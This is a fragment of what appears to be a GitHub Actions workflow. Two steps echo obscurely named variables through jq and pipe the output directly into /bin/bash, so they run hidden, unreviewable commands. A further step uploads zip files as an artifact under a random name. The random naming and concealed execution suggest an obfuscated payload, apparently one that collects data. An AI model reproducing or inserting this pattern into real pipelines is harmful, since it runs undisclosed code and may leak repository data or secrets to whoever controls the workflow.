          echo $meg01 | jq -r .zrdmn419 | /bin/bash
          echo $g99 | jq -r .nknf99874 | /bin/bash

      - name: Store output
        uses: actions/upload-artifact@v4
        with:
          name: xClpHoEb
          path: "*.zip"
